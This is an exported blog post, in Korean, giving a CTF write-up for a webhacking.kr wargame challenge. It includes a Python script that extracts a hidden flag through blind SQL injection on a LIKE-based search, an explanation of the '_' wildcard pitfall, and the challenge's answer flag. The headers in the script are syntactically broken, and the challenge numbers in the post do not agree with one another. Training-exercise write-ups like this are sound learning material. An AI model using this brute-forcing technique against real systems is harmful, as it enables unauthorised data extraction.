@@ -1,0 +1,471 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "1132320c-7420-514d-a486-506b3c42657a",
+  "kind": "posts",
+  "title": "[webhacking.kr]  old-56 문제",
+  "slug": "tistory-74",
+  "description": "1. 문제 정보문제 번호 : old -61문제 점수 : 25점 2. 문제 분석56번 문제에 들어가면 BOARD가 들어가고 search가 나온다. subject에서 readme를 누르면 access denied가 뜨고 hi~를 누르면 hello가 나온다. read me에 내용을 읽어야할 것 같다.search버튼에 1,id, sub,0을 눌러도 아무것도 안나온다 하지만 hi를 눌러보면 admin이 나왔다그래서 내용을 기반으로 검색하는 거 같아 hello를 검색하니 guest가 나왔다. sql에서 검색을 아래 쿼리로 하고 있는 것 같다.SELECT * FROM board WHERE content LIKE '%{검색어}%'3. 풀이내용을 바탕으로 검색하니까 readme의 내용을 유츄해보면 flag가 있을 것이..",
+  "category": "Wargame / webhacking.kr",
+  "date": "2026-02-02",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-02-02T14:38:09+09:00",
+  "updatedAt": "2026-02-02T14:42:52+09:00",
+  "sourceDigest": "047bbb2a8710f4d46055d44aa9979edb58172d4ba35630001ba2ab8abc971d73",
+  "assets": [
+    {
+      "id": "9acb4315-65ba-5317-b969-2590aa571c7f",
+      "name": "tistory-74-9acb4315-65ba-5317-b969-2590aa571c7f.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/9acb4315-65ba-5317-b969-2590aa571c7f.png",
+      "sha": "a4231453d3cd44beea999c92bade2a6091ee7cb5"
+    },
+    {
+      "id": "85679397-f8fe-5bcf-bda0-98d4e27e53bb",
+      "name": "tistory-74-85679397-f8fe-5bcf-bda0-98d4e27e53bb.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/85679397-f8fe-5bcf-bda0-98d4e27e53bb.png",
+      "sha": "1847f9a75f60747b63b8c20fa4cbb233e3bb914d"
+    },
+    {
+      "id": "86c6ff99-cad8-51f2-8d49-94e24218ab1e",
+      "name": "tistory-74-86c6ff99-cad8-51f2-8d49-94e24218ab1e.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/86c6ff99-cad8-51f2-8d49-94e24218ab1e.png",
+      "sha": "2691669a0da0903dd4664dff97d4026e8dfc2c0b"
+    },
+    {
+      "id": "b9b26dee-b2f6-5af3-a0b1-25c8d5477475",
+      "name": "tistory-74-b9b26dee-b2f6-5af3-a0b1-25c8d5477475.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/b9b26dee-b2f6-5af3-a0b1-25c8d5477475.png",
+      "sha": "78cedbfad5bc521f8f131ed213812bddaa96dd52"
+    },
+    {
+      "id": "664e85c8-b2af-5745-9439-e34b5ba2646f",
+      "name": "tistory-74-664e85c8-b2af-5745-9439-e34b5ba2646f.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/664e85c8-b2af-5745-9439-e34b5ba2646f.png",
+      "sha": "3991e64cd7b0eefe552cf3d9570ff5046563f5c8"
+    },
+    {
+      "id": "52d02324-4004-5c11-a6bd-74f855025c21",
+      "name": "tistory-74-52d02324-4004-5c11-a6bd-74f855025c21.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/52d02324-4004-5c11-a6bd-74f855025c21.png",
+      "sha": "43658982bbf40f0f8cffa8cbee7f5802890f34a3"
+    },
+    {
+      "id": "858ae87c-5a9f-5c2a-8f09-818fb2295738",
+      "name": "tistory-74-858ae87c-5a9f-5c2a-8f09-818fb2295738.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/858ae87c-5a9f-5c2a-8f09-818fb2295738.png",
+      "sha": "5f483c5efed187d626db6752e34d6e16d40a3a62"
+    },
+    {
+      "id": "a4235436-4316-5863-8bc5-7183130b7268",
+      "name": "tistory-74-a4235436-4316-5863-8bc5-7183130b7268.png",
+      "type": "image/png",
+      "path": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/a4235436-4316-5863-8bc5-7183130b7268.png",
+      "sha": "4ca7ffdd2014102cae2149f3777ab7c25d3b66b2"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "9acb4315-65ba-5317-b969-2590aa571c7f",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/9acb4315-65ba-5317-b969-2590aa571c7f.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 문제 정보"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 번호 : old -61"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 점수 : 25점"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제 분석"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "56번 문제에 들어가면 BOARD가 들어가고 search가 나온다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "85679397-f8fe-5bcf-bda0-98d4e27e53bb",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/85679397-f8fe-5bcf-bda0-98d4e27e53bb.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "subject에서 readme를 누르면 access denied가 뜨고 hi~를 누르면 hello가 나온다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "86c6ff99-cad8-51f2-8d49-94e24218ab1e",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/86c6ff99-cad8-51f2-8d49-94e24218ab1e.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "b9b26dee-b2f6-5af3-a0b1-25c8d5477475",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/b9b26dee-b2f6-5af3-a0b1-25c8d5477475.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "read me에 내용을 읽어야할 것 같다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "search버튼에 1,id, sub,0을 눌러도 아무것도 안나온다 하지만 hi를 눌러보면 admin이 나왔다"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그래서 내용을 기반으로 검색하는 거 같아 hello를 검색하니 guest가 나왔다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "sql에서 검색을 아래 쿼리로 하고 있는 것 같다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "python"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "SELECT * FROM board WHERE content LIKE '%{검색어}%'"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "664e85c8-b2af-5745-9439-e34b5ba2646f",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/664e85c8-b2af-5745-9439-e34b5ba2646f.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 풀이"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "내용을 바탕으로 검색하니까 readme의 내용을 유츄해보면 flag가 있을 것이다. flag를 입력해보면 admin이 뜬다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "52d02324-4004-5c11-a6bd-74f855025c21",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/52d02324-4004-5c11-a6bd-74f855025c21.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그리고 그 다음 문자들을 순차적으로 하나씩 대입해보면 flag{hi까지 찾았는데 파이썬 스크립트로 자동화 해보자"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "python"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "import requests\nimport string\n\n# 대상 URL\nurl = \"https://webhacking.kr/challenge/web-33/index.php\"\n\n# 사용자 세션 쿠키 (제공해주신 데이터 적용)\ncookies = {\n    \"PHPSESSID\": \"\"\n}\n\n# 헤더 설정 (WAF 우회 및 일반 브라우저처럼 보이기 위함)\nheaders = {\n    \"User-Agent\": \n    \"Content-Type\": \n}\n\n# 검색 가능한 문자열 집합 (알파벳, 숫자, 특수문자 등)\n# SQL 와일드카드인 _ 와 % 는 문맥에 따라 주의가 필요합니다.\nchars = string.ascii_letters + string.digits + \"}_?\" \n\n# 현재까지 알아낸 플래그 (제공해주신 내용)\n# 주의: 만약 _가 와일드카드로 쓰였다면 실제 문자는 다를 수 있습니다.\n# 여기서는 입력하신 그대로 시작점으로 잡습니다.\ncurrent_flag = \"flag{hi\"\n\nprint(f\"Brute Force : {current_flag} \")\n\nwhile True:\n    found_char = False\n    \n    for char in chars:\n        # 테스트할 페이로드 구성\n        # SQL 검색 구문에 따라 % 와일드카드가 필요할 수도 있습니다.\n        # 예: payload = current_flag + char + \"%\"\n        # 여기서는 단순히 문자열을 이어 붙여 전송합니다.\n        payload = current_flag + char\n        \n        data = {\n            \"search\": payload\n        }\n        \n        try:\n            response = requests.post(url, headers=headers, cookies=cookies, data=data)\n            \n            # 참/거짓 판별 로직\n            # 응답에 \"admin\" 텍스트가 포함되어 있거나\n            # Content-Length가 373 근처라면 참으로 간주\n            if \"admin\" in response.text and \"<td>admin</td>\" in response.text:\n                current_flag += char\n                print(f\"find: {current_flag}\")\n                found_char = True\n                break\n                \n        except Exception as e:\n            print(f\"에러 발생: {e}\")\n            break\n    \n    # 해당 위치의 문자를 찾지 못했거나 플래그가 닫는 괄호 }로 끝나면 종료\n    if not found_char:\n        print(\"더 이상 매칭되는 문자를 찾을 수 없습니다.\")\n        break\n        \n    if current_flag.endswith(\"}\"):\n        print(f\"FLAG: {current_flag}\")\n        break"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "858ae87c-5a9f-5c2a-8f09-818fb2295738",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/858ae87c-5a9f-5c2a-8f09-818fb2295738.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "a4235436-4316-5863-8bc5-7183130b7268",
+          "src": "/assets/uploads/1132320c-7420-514d-a486-506b3c42657a/a4235436-4316-5863-8bc5-7183130b7268.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그런데 여기서 조심해야할 것이 _ 와일드 카드이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "와일드 카드는 _에 어떤 값이 들어가도 무시하고 실행한다 따라서 _를 다른 값보다 먼저 검사하면 _가 먼저 참이 되므로 조심해야한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 코드에서chars = string.ascii_letters + string.digits + \"}?_\"로 변경하면 flag는 이렇게 나온다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "python"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "flag{himiko_toga_is_cute_dont_you_think_so?}"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "게시판 검색 기능에서 readme 내용에 포함된 플래그를 찾기 위해 참과 거짓 반응을 구분하는 Blind SQL Injection 공격을 수행하는 문제이다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "파이썬 스크립트로 자동화하던 중 SQL의 LIKE 연산자에서 와일드카드로 쓰이는 _ 문자가 모든 문자와 매칭되어 오탐지를 유발하는 논리적 오류를 발견했다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "이를 해결하기 위해 _ 문자를 검사 리스트의 가장 마지막 순서로 배치하여 우선순위를 낮춤으로써 정확한 플래그를 얻었다"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/74",
+    "originalId": "74",
+    "publishedAt": "2026-02-02T14:38:09+09:00",
+    "updatedAt": "2026-02-02T14:42:52+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
